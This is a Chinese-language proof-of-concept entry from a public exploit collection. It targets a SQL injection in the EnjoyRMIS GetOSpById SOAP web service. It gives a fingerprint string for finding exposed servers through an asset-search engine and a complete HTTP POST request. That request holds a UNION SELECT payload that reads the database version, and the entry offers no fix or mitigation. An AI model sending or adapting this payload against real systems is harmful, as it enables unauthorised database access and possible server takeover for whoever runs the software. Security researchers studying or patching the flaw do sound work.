---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# EnjoyRMIS GetOSpById存在SQL注入漏洞

# 一、漏洞简介
EnjoyRMIS存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

# 二、影响版本
+ EnjoyRMIS

# 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征


# 四、漏洞复现
```plain
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOSpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOSpById xmlns="http://tempuri.org/">
      <sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
    </GetOSpById>
  </soap:Body>
</soap:Envelope> 
```


sqlmap


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zpzm4hme69hpf525>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
